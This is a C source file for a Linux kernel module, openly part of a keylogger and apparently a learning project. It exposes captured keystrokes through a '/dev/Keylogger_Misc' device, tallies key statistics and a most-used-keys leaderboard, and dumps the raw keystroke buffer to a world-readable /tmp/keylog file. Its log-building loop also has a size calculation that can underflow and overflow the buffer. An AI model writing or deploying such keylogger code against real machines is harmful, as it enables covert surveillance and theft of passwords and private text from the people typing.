// SPDX-License-Identifier: GPL-2.0
#include "logger.h"

#define MOST_USED_NAME(i)   (stats.most_used[(i)].name)
#define MOST_USED_USAGE(i)  (stats.most_used[(i)].usage)
#define LOGS_SIZE 4096
// key_category_stats_t stats = {
// 	.letters = 0,
//     .digit = 0,
//     .punctuation = 0,
//     .spaces = 0,
//     .numpad = 0,
//     .control = 0,
//     .function = 0,
//     .toggle = 0,
//     .special = 0,
//     .navigation = 0,
//     .total = 0,
//     .erased = 0,
//     .most_used = {
// 		{0, NULL, 0, 0, 0, 0},
// 		{0, NULL, 0, 0, 0, 0},
// 		{0, NULL, 0, 0, 0, 0},
// 		{0, NULL, 0, 0, 0, 0},
// 		{0, NULL, 0, 0, 0, 0},
// 	}
// };

key_category_stats_t stats;

static int my_open(struct inode *node, struct file *file)
{
	printk(KERN_INFO "Misc Device number %d %d - Open function called\n", imajor(node), iminor(node));
	if (file->f_mode & FMODE_READ)
		printk(KERN_INFO "Misc Device - Open function called with read permissions\n");
	if (file->f_mode & FMODE_WRITE)
		return -EPERM;
	return 0;
}

static int my_close(struct inode *node, struct file *file)
{
	printk(KERN_INFO "Misc Device number %d %d - Close function called\n", imajor(node), iminor(node));
	return 0;
}

static ssize_t my_write(struct file *file, const char __user *user_buf, size_t user_len, loff_t *ppos)
{
	printk(KERN_INFO "Misc Device : Hello from Write : Weird thing here :)\n");
	return 0;
}

static ssize_t my_read(struct file *file, char __user *user_buf, size_t user_len, loff_t *ppos)
{
	mutex_lock(&mut);

    // t_list *tmp = inputs.inputs_lst;
    // while(tmp) {
    //     printk(KERN_INFO "%s", (char *)tmp->content);
    //     tmp = tmp->next;
    // }

	if (*ppos >= inputs.ibuf_len) {
		mutex_unlock(&mut);
		return 0;
	}

	size_t to_copy = (user_len < (inputs.ibuf_len - *ppos)) ? user_len : (inputs.ibuf_len - *ppos);

    if (copy_to_user(user_buf, inputs.inputs_buffer + *ppos, to_copy)) {
        pr_err("Misc Device - Error copying data to userspace\n");
		mutex_unlock(&mut);
		return -EFAULT;
    }

    *ppos += to_copy;

	mutex_unlock(&mut);
    return to_copy;
}

////////////////////////////////////////////////////////////
// Misc Device Part

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.write = my_write,
	.read = my_read,
	.open = my_open,
	.release = my_close,
};

struct miscdevice my_misc = {
	.name = "Keylogger_Misc",
	.minor = MISC_DYNAMIC_MINOR,
	.fops = &fops,
};

void logger_stats(keyboard_key_t key) {
    stats.total++;
	if (key.keycode == 0x0E)
		stats.erased++;
    switch (key.category) {
        case KEY_LETTERS:
            stats.letters++;
            break;
        case KEY_DIGIT:
            stats.digit++;
            break;
        case KEY_PUNCTUATION:
            stats.punctuation++;
            break;
        case KEY_SPACES:
            stats.spaces++;
            break;
        case KEY_NUMPAD:
            stats.numpad++;
            break;
        case KEY_CONTROL:
            stats.control++;
            break;
        case KEY_FUNCTION:
            stats.function++;
            break;
        case KEY_TOGGLE:
            stats.toggle++;
            break;
        case KEY_SPECIAL:
            stats.special++;
            break;
        case KEY_NAVIGATION:
            stats.navigation++;
            break;
        default:
            break;
    }
}

static void logger_save_to_keylog(const char *data, size_t len)
{

    struct file *file = filp_open("/tmp/keylog", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (IS_ERR(file))
        return;
    loff_t pos = 0;
    ssize_t written;
    char *stats_logs = kmalloc(LOGS_SIZE, GFP_KERNEL);

    int n = snprintf(stats_logs, LOGS_SIZE,	\
        "======= Keylogger Statistics =======\n"	\
        "Total keys pressed   : %zu\n"	\
        "Number of erased     : %zu\n"	\
        "Letters              : %zu\n"	\
        "Digits               : %zu\n"	\
        "Punctuation          : %zu\n"	\
        "Spaces               : %zu\n"	\
        "Numpad               : %zu\n"	\
        "Control keys         : %zu\n"	\
        "Function keys        : %zu\n"	\
        "Toggle keys          : %zu\n"	\
        "Special keys         : %zu\n"	\
        "Navigation keys      : %zu\n"	\
        "====================================\n"	\
        "LeaderBoard :\n"	\
        "Top 1 : %s (%zu)\n"	\
        "Top 2 : %s (%zu)\n"	\
        "Top 3 : %s (%zu)\n"	\
        "Top 4 : %s (%zu)\n"	\
        "Top 5 : %s (%zu)\n"	\
        "====================================\n",	\
        stats.total,	\
        stats.erased,	\
        stats.letters,	\
        stats.digit,	\
        stats.punctuation,	\
        stats.spaces,	\
        stats.numpad,	\
        stats.control,	\
        stats.function,	\
        stats.toggle,	\
        stats.special,	\
        stats.navigation,	\
        MOST_USED_NAME(0), (size_t)MOST_USED_USAGE(0),	\
        MOST_USED_NAME(1), (size_t)MOST_USED_USAGE(1),	\
        MOST_USED_NAME(2), (size_t)MOST_USED_USAGE(2),	\
        MOST_USED_NAME(3), (size_t)MOST_USED_USAGE(3),	\
        MOST_USED_NAME(4), (size_t)MOST_USED_USAGE(4)	\
    );

    written = kernel_write(file, inputs.inputs_buffer, inputs.ibuf_len, &pos);
    written = kernel_write(file, data, len, &pos);
    written = kernel_write(file, stats_logs, n, &pos);
    filp_close(file, NULL);
    kfree(stats_logs);
}


void logger_final_log(void) {
    char *final_logs = kmalloc(LOGS_SIZE * 2, GFP_KERNEL);
    size_t offset = 0;

    offset += snprintf(final_logs + offset, LOGS_SIZE - offset, \
        "======= Keylogger Final Logs =======\n");
    for (int i = 0; i < 256; i++) {
        keyboard_key_t key = key_table[i];
        if (key.keycode == 0 || key.state == RELEASE)
            continue;
        int release_code = i + 0x80;
        keyboard_key_t key_released = key_table[release_code];
        size_t total = (size_t)(key.usage + key_released.usage);
        if (total == 0)
            continue;
        offset += snprintf(final_logs + offset, LOGS_SIZE - offset, \
            "KeyName : %-12s | Used : %6zu | Pressed : %6zu | Released : %6zu\n", \
            key.name, total, key.usage, key_released.usage);
		for (int i = 0; i < 5; i++) {
			if (key.usage > stats.most_used[i].usage) {
				for (int j = 4; j > i; j--)
					stats.most_used[j] = stats.most_used[j-1];
				keyboard_set_key(&stats.most_used[i], key, key.state);
				break;
			}
		}
	}

    offset += snprintf(final_logs + offset, LOGS_SIZE - offset, \
        "====================================\n");
    printk(KERN_INFO "%s", final_logs);
	logger_save_to_keylog(final_logs, offset);
    kfree(final_logs);
}

int logger_init(void)
{
	int status = misc_register(&my_misc);

	if (status) {
		printk(KERN_ALERT "Error: misc register failed\n");
		return -status;
	}
	printk(KERN_INFO "Misc Device Registred at /dev/Keylogger_Misc\n");
	return 0;
}

EXPORT_SYMBOL(my_misc);
EXPORT_SYMBOL(logger_init);